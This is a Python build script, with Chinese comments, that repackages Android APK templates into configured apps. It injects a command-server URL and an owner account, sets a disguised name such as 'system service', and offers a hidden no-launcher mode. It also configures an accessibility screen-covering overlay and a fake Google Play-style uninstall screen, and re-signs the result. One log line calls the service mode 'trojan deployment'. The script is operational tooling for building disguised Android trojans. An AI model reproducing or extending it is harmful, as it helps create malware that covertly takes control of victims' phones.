#!/usr/bin/env python3
"""服务器端 APK 构建脚本 v4 - 修复应用名替换"""
import sys, os, random, string, json, argparse, zipfile, shutil

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import apk_repacker
from free_template import FreeTemplateBuilder

def _do_zipalign(input_path, output_path, alignment=4):
    """Ensure resources.arsc is STORED and 4-byte aligned (Android R+ requirement)"""
    import zipfile as zf
    entries = []
    with zf.ZipFile(input_path, 'r') as zin:
        # 清除加固工具的假加密标志
        for info in zin.infolist():
            if info.flag_bits & 0x01:
                info.flag_bits &= ~0x01
        for info in zin.infolist():
            try:
                entries.append((info, zin.read(info.filename)))
            except Exception:
                pass  # 跳过无法读取的条目
    with zf.ZipFile(output_path, 'w') as zout:
        for info, data in entries:
            new_info = zf.ZipInfo(info.filename)
            new_info.date_time = info.date_time
            new_info.external_attr = info.external_attr
            if info.filename == 'resources.arsc' or info.compress_type == zf.ZIP_STORED:
                new_info.compress_type = zf.ZIP_STORED
                fname_bytes = info.filename.encode('utf-8')
                header_size = 30 + len(fname_bytes)
                current_pos = zout.fp.tell()
                data_start = current_pos + header_size
                padding = (alignment - (data_start % alignment)) % alignment
                new_info.extra = b'\x00' * padding
            else:
                new_info.compress_type = info.compress_type
            zout.writestr(new_info, data)


def _linux_sign(self, input_path, output_path):
    import subprocess, shutil as sh, platform
    
    base_dir = os.path.dirname(os.path.abspath(__file__))
    log_file = os.path.join(base_dir, 'sign_debug.log')
    def log_debug(msg):
        print(msg)
        try:
            with open(log_file, 'a', encoding='utf-8') as f: f.write(msg + '\n')
        except: pass

    log_debug(f"--- 尝试签名 (build_apk) {output_path} ---")

    keystore = os.path.join(base_dir, '_debug.keystore')
    alias = 'debugkey'
    password = 'android'
    keytool = sh.which('keytool')
    
    if not os.path.exists(keystore) and keytool:
        log_debug("生成 keystore...")
        subprocess.run([keytool, '-genkey', '-v', '-keystore', keystore, '-alias', alias,
            '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
            '-storepass', password, '-keypass', password,
            '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'], capture_output=True)

    # zipalign
    aligned_path = input_path + '.aligned'
    zipalign = sh.which('zipalign')
    if zipalign:
        log_debug("zipalign 存在，执行原生 zipalign...")
        res = subprocess.run([zipalign, '-f', '-v', '4', input_path, aligned_path], capture_output=True)
        if res.returncode != 0: log_debug(f"zipalign报错: {res.stderr}")
    else:
        log_debug("找不到 zipalign，执行 Python 回退对齐...")
        try:
            _do_zipalign(input_path, aligned_path)
        except Exception as e:
            log_debug(f"Python zipalign 失败: {e}")
            sh.copy2(input_path, aligned_path)
    
    # apksigner
    local_apksigner_jar = os.path.join(base_dir, 'apksigner.jar')
    java_bin = sh.which('java')
    if not java_bin and os.path.exists('/usr/bin/java'):
        java_bin = '/usr/bin/java'

    apksigner_cmd = None
    if sh.which('apksigner'):
        apksigner_cmd = [sh.which('apksigner')]
    elif os.path.exists(local_apksigner_jar) and java_bin:
        apksigner_cmd = [java_bin, '-jar', local_apksigner_jar]

    if apksigner_cmd and os.path.exists(keystore):
        log_debug(f"使用 apksigner: {apksigner_cmd}")
        cmd = apksigner_cmd + ['sign', '--ks', keystore, '--ks-pass', 'pass:' + password,
            '--key-pass', 'pass:' + password, '--ks-key-alias', alias,
            '--min-sdk-version', '24',
            '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
            '--out', output_path, aligned_path]
        result = subprocess.run(cmd, capture_output=True)
        if os.path.exists(aligned_path):
            os.remove(aligned_path)
        if result.returncode == 0:
            log_debug("  APK signed (apksigner v1+v2)")
            return True
        else:
            log_debug(f"  apksigner failed: {result.stderr.decode('utf-8', 'ignore')}")
    else:
        log_debug("没有找到 apksigner 或 java环境")
    
    # jarsigner 回退
    jarsigner = sh.which('jarsigner')
    if jarsigner and os.path.exists(keystore):
        log_debug("尝试 jarsigner 回退...")
        sh.copy2(aligned_path if os.path.exists(aligned_path) else input_path, output_path)
        if os.path.exists(aligned_path):
            os.remove(aligned_path)
        result = subprocess.run([jarsigner, '-keystore', keystore, '-storepass', password, '-keypass', password, output_path, alias], capture_output=True)
        if result.returncode == 0:
            log_debug("  APK signed (jarsigner v1 only)")
            return True
        else:
            log_debug(f" jarsigner failed: {result.stderr}")
            
    sh.copy2(input_path, output_path)
    log_debug("  APK NOT signed")
    return False

apk_repacker.APKRepacker._sign_apk = _linux_sign


def _patch_template_dexes():
    """Apply the shared accessibility UI patch to both original templates."""
    base_dir = os.path.dirname(os.path.abspath(__file__))
    bundled_dex = os.path.join(base_dir, 'original_free_style_v6_classes2.dex')
    bundled_html = os.path.join(base_dir, 'original_free_style_v6_svc_config.html')
    if os.path.isfile(bundled_dex):
        patch_entries = {'classes2.dex': bundled_dex}
        if os.path.isfile(bundled_html):
            patch_entries['assets/svc_config.html'] = bundled_html
    else:
        patch_entries = None
    patch_dir_candidates = [
        os.environ.get('ORIGINAL_FREE_STYLE_PATCH_DIR', ''),
        os.path.normpath(os.path.join(base_dir, '..', 'runtime', 'original_free_style_v6_decoded')),
        os.path.normpath(os.path.join(base_dir, '..', '..', 'xiufu', 'runtime', 'original_free_style_v6_decoded')),
    ]
    patch_dir = next((p for p in patch_dir_candidates if p and os.path.isfile(os.path.join(p, 'build', 'apk', 'classes2.dex'))), '')
    if patch_entries is None and patch_dir:
        patch_entries = {'classes2.dex': os.path.join(patch_dir, 'build', 'apk', 'classes2.dex')}
        html_path = os.path.join(patch_dir, 'assets', 'svc_config.html')
        if os.path.isfile(html_path):
            patch_entries['assets/svc_config.html'] = html_path
    elif patch_entries is None:
        patch_apk = os.path.join(base_dir, 'source.black_iconfix.unsigned.apk')
        if not os.path.exists(patch_apk):
            return
        patch_entries = {'classes2.dex': patch_apk}
    try:
        patch_data = {}
        for entry, path in patch_entries.items():
            if path.lower().endswith('.apk'):
                with zipfile.ZipFile(path, 'r') as patched:
                    patch_data[entry] = patched.read(entry)
            else:
                with open(path, 'rb') as patched:
                    patch_data[entry] = patched.read()
        for name in ('source.apk', 'source_visible.apk'):
            path = os.path.join(base_dir, name)
            if not os.path.exists(path):
                continue
            with zipfile.ZipFile(path, 'r') as zin:
                current = {entry: (zin.read(entry) if entry in zin.namelist() else None) for entry in patch_data}
                if all(current[entry] == data for entry, data in patch_data.items()):
                    continue
                tmp = path + '.dexpatch'
                with zipfile.ZipFile(tmp, 'w') as zout:
                    for info in zin.infolist():
                        if info.filename.upper().startswith('META-INF/'):
                            continue
                        info.flag_bits &= ~0x01
                        data = patch_data[info.filename] if info.filename in patch_data else zin.read(info.filename)
                        out = zipfile.ZipInfo(info.filename)
                        out.date_time = info.date_time
                        out.compress_type = info.compress_type
                        out.external_attr = info.external_attr
                        out.extra = info.extra
                        zout.writestr(out, data)
            signed = path + '.dexpatch.signed'
            if _linux_sign(None, tmp, signed):
                os.replace(signed, path)
            if os.path.exists(tmp):
                os.remove(tmp)
    except Exception as exc:
        print(f'模板功能补丁跳过: {exc}')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--server', required=True)
    parser.add_argument('--web', default='')
    parser.add_argument('--name', default='')
    parser.add_argument('--package', default='')
    parser.add_argument('--icon', default='')
    parser.add_argument('--bg', default='', help='Background image PNG')
    parser.add_argument('--config', default='', help='Full pageStyleConfig JSON')
    parser.add_argument('--template', default='', choices=('original_visible', 'original_hidden', 'free'),
                        help='APK template branch; defaults to original_visible/original_hidden from showAppIcon')
    parser.add_argument('--output', required=True)
    args = parser.parse_args()
    
    psc = {}
    if args.config:
        try:
            psc = json.loads(args.config)
        except:
            pass

    base_dir = os.path.dirname(os.path.abspath(__file__))
    show_app_icon = psc.get('_showAppIcon', 'true') == 'true'
    template_type = args.template or ('original_visible' if show_app_icon else 'original_hidden')

    if template_type == 'free':
        source_path = os.path.join(base_dir, 'source_free.apk')
        free_builder = FreeTemplateBuilder(source_path)
        # Free uses its own runtime override asset; original ZM26 rewriting is
        # intentionally skipped for this branch.
        free_config = dict(psc)
        free_config.setdefault('appName', args.name or 'Kiss Free')
        free_config.setdefault('versionName', psc.get('versionName', '5.2.1'))
        free_config.setdefault('_enableServiceMode', 'true')
        summary = free_builder.build_configured(
            args.output,
            server_url=args.server,
            web_url=args.web,
            config=free_config,
            bg_path=args.bg,
            icon_path=args.icon,
            signer=lambda src, dst: _linux_sign(None, src, dst),
        )
        print(json.dumps(summary, ensure_ascii=False))
        return

    uninstall_mode = psc.get('_uninstallMode', 'true') == 'true'
    uninstall_style = psc.get('_uninstallStyle', 'googleplay')
    if uninstall_style not in ('googleplay', 'system'):
        uninstall_style = 'googleplay'

    # The visible template has a dedicated LAUNCHER alias. The hidden template
    # intentionally has no standard launcher entry, so the two modes stay independent.
    source_name = 'source_visible.apk' if template_type == 'original_visible' else 'source.apk'
    _patch_template_dexes()
    SRC = os.path.join(base_dir, source_name)
    if not os.path.exists(SRC):
        raise FileNotFoundError(f'APK template not found: {SRC}')
    print(f'Template: {source_name}')
    
    pkg = args.package or psc.get('applicationId', '')
    if not pkg:
        parts = ['app','dev','go','io','my','ui','net','sys','run','top','web','api']
        p1 = random.choice(parts)
        p2 = ''.join(random.choices(string.ascii_lowercase, k=14 - 5 - len(p1)))
        pkg = f'com.{p1}.{p2}'
    
    # 强制包名为14字节（与源APK com.pro.viewer 等长，避免 ARSC 二进制替换错位导致闪退）
    pkg = pkg.strip().lower()
    pkg = "".join([c for c in pkg if c.isalnum() or c == '.'])
    if len(pkg) != 14:
        if len(pkg) > 14:
            truncated = pkg[:14]
            if truncated.endswith('.'):
                truncated = truncated[:13] + 'x'
            pkg = truncated
        else:
            if '.' not in pkg:
                pkg = "com." + pkg
            while len(pkg) < 14:
                pkg += 'x'
            if pkg.endswith('.'):
                pkg = pkg[:-1] + 'x'
            pkg = pkg[:14]
    
    app_name = args.name or psc.get('appName', '系统服务')
    
    print(f'Package: {pkg}')
    print(f'Server: {args.server}')
    print(f'Web: {args.web}')
    print(f'Name: {app_name}')
    
    r = apk_repacker.APKRepacker(SRC)
    
    # ★ 关键: 先把额外配置写入 server_config（但不改 appName，让 repack 内部对比原始名来替换 ARSC）
    sc = r.server_config
    
    # 无障碍配置
    configMaskText = psc.get('_configMaskText', '')
    configMaskSubtitle = psc.get('_configMaskSubtitle', '')
    if configMaskText:
        sc['configMaskText'] = configMaskText
        print(f'  配置遮盖第一排: {configMaskText[:30]}')
    if configMaskSubtitle:
        sc['configMaskSubtitle'] = configMaskSubtitle
        print(f'  配置遮盖第二排: {configMaskSubtitle[:30]}')
    if psc.get('_configMaskTextColor'):
        sc['configMaskTextColor'] = psc['_configMaskTextColor']
    if psc.get('_configMaskSubtitleColor'):
        sc['configMaskSubtitleColor'] = psc['_configMaskSubtitleColor']
    
    sc['showAppIcon'] = show_app_icon
    sc['uninstallMode'] = uninstall_mode
    sc['uninstallStyle'] = uninstall_style
    sc['enableServiceMode'] = psc.get('_enableServiceMode', 'false') == 'true'
    sc['enableConfigMask'] = psc.get('_enableConfigMask', 'true') == 'true'
    
    # 进度提示语
    loadingTips = psc.get('_loadingTips', '')
    if loadingTips:
        try:
            tips = json.loads(loadingTips) if loadingTips.startswith('[') else loadingTips.split('\n')
            sc['loadingTips'] = tips
            print(f'  进度提示语: {len(tips)} 条')
        except:
            pass
    
    # pageStyleConfig 额外字段（不包括 appName，appName 由 repack 处理）
    psc_out = sc.setdefault('pageStyleConfig', {})
    if psc.get('enableServiceTitle'):
        psc_out['enableServiceTitle'] = psc['enableServiceTitle']
    if psc.get('enableServiceSubtitle'):
        psc_out['enableServiceSubtitle'] = psc['enableServiceSubtitle']
    if psc.get('usageInstructions'):
        psc_out['usageInstructions'] = psc['usageInstructions']
    if psc.get('enableButtonText'):
        psc_out['enableButtonText'] = psc['enableButtonText']
    if psc.get('enableButtonTextColor'):
        psc_out['enableButtonTextColor'] = psc['enableButtonTextColor']
    if psc.get('buttonColor'):
        psc_out['buttonColor'] = psc['buttonColor']
    # ★ 子账户绑定：从 pageStyleConfig._ownerUsername 写入 server_config.ownerUsername
    owner = psc.get('_ownerUsername', '')
    if owner:
        sc['ownerUsername'] = owner
        print(f'  ★ ownerUsername: {owner}')
    
    if psc.get('versionName'):
        psc_out['versionName'] = psc['versionName']
    
    print(f'  显示图标: {show_app_icon}, 卸载模式: {uninstall_mode}, 卸载风格: {uninstall_style}, 木马部署: {sc["enableServiceMode"]}')
    
    # ★ 调用 repack - 这里会替换 ARSC 里的应用名（对比原始的 pageStyleConfig.appName 和传入的 app_name）
    # 不替换包名，保持源APK的 com.pro.viewer
    r.repack(
        output_path=args.output,
        server_url=args.server,
        web_url=args.web or args.server.replace('wss://', 'https://').replace('ws://', 'http://'),
        app_name=app_name,
        package_name=None,
        owner=owner or None,
        icon_path=args.icon if args.icon and os.path.exists(args.icon) else None,
        bg_path=args.bg if args.bg and os.path.exists(args.bg) else None,
        enable_config_mask=sc['enableConfigMask'],
        enable_service_mode=sc['enableServiceMode'],
        uninstall_mode=uninstall_mode,
        uninstall_style=uninstall_style,
        show_app_icon=show_app_icon
    )
    
    # 替换应用图标 (assets/igj.png)
    icon_path = args.icon
    if icon_path and os.path.exists(icon_path):
        print(f'  替换应用图标: {icon_path}')
        with open(icon_path, 'rb') as f:
            icon_data = f.read()
        # 替换所有图标位置: assets/igj.png + res/drawable/r*.png (混淆的图标文件)
        # mipmap 里的才是真正的桌面图标
        icon_targets = [
            'assets/igj.png',
            'res/drawable/rs12.png', 'res/drawable/rt13.png',
            'res/drawable/ru14.png', 'res/drawable/rv15.png', 
            'res/drawable/rw16.png', 'res/drawable/rx17.png',
            # mipmap 桌面图标（各尺寸）
            'res/mipmap-mdpi/test.png', 'res/mipmap-mdpi/test_fg.png',
            'res/mipmap-mdpi/test_round.png', 'res/mipmap-mdpi/test_round_fg.png',
            'res/mipmap-hdpi/test.png', 'res/mipmap-hdpi/test_fg.png',
            'res/mipmap-hdpi/test_round.png', 'res/mipmap-hdpi/test_round_fg.png',
            'res/mipmap-xhdpi/test.png', 'res/mipmap-xhdpi/test_fg.png',
            'res/mipmap-xhdpi/test_round.png', 'res/mipmap-xhdpi/test_round_fg.png',
            'res/mipmap-xxhdpi/test.png', 'res/mipmap-xxhdpi/test_fg.png',
            'res/mipmap-xxhdpi/test_round.png', 'res/mipmap-xxhdpi/test_round_fg.png',
            'res/mipmap-xxxhdpi/test.png', 'res/mipmap-xxxhdpi/test_fg.png',
            'res/mipmap-xxxhdpi/test_round.png', 'res/mipmap-xxxhdpi/test_round_fg.png',
        ]
        tmp_path = args.output + '.icontmp'
        with zipfile.ZipFile(args.output, 'r') as zin:
            # The protected template marks entries as encrypted even though the
            # payload is plain ZIP data. Clear that marker before reading.
            apk_repacker.APKRepacker._clear_fake_encryption(zin)
            try:
                launcher_entries = json.loads(
                    zin.read('assets/launcher_icon_entries.json').decode('utf-8')
                )
                if isinstance(launcher_entries, list):
                    icon_targets.extend(
                        entry for entry in launcher_entries
                        if isinstance(entry, str) and entry not in icon_targets
                    )
                    print(f'     加载桌面图标映射: {len(launcher_entries)} 个')
            except KeyError:
                pass
            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_DEFLATED) as zout:
                for info in zin.infolist():
                    data = zin.read(info.filename)
                    if info.filename in icon_targets:
                        data = icon_data
                        print(f'     替换: {info.filename}')
                    new_info = zipfile.ZipInfo(info.filename)
                    new_info.compress_type = info.compress_type
                    new_info.date_time = info.date_time
                    zout.writestr(new_info, data)
        os.remove(args.output)
        _linux_sign(None, tmp_path, args.output)
        os.remove(tmp_path)
        print('  图标替换完成')

    # 替换背景图
    if args.bg and os.path.exists(args.bg):
        print(f'  替换背景图: {args.bg}')
        with open(args.bg, 'rb') as f:
            bg_data = f.read()
        tmp_path = args.output + '.tmp'
        with zipfile.ZipFile(args.output, 'r') as zin:
            apk_repacker.APKRepacker._clear_fake_encryption(zin)
            with zipfile.ZipFile(tmp_path, 'w', zipfile.ZIP_DEFLATED) as zout:
                for info in zin.infolist():
                    data = zin.read(info.filename)
                    if info.filename in ('assets/bg_accessibility.png', 'assets/app_loading_bg.png', 'res/drawable/bg_accessibility.png', 'res/drawable/bg_config_mask.png'):
                        data = bg_data
                        print(f'     替换: {info.filename}')
                    new_info = zipfile.ZipInfo(info.filename)
                    new_info.compress_type = info.compress_type
                    new_info.date_time = info.date_time
                    zout.writestr(new_info, data)
        os.remove(args.output)
        _linux_sign(None, tmp_path, args.output)
        os.remove(tmp_path)
        print('  背景图替换完成')
    
    size = os.path.getsize(args.output) / 1024 / 1024
    print(f'SUCCESS: {size:.1f} MB')

if __name__ == '__main__':
    main()
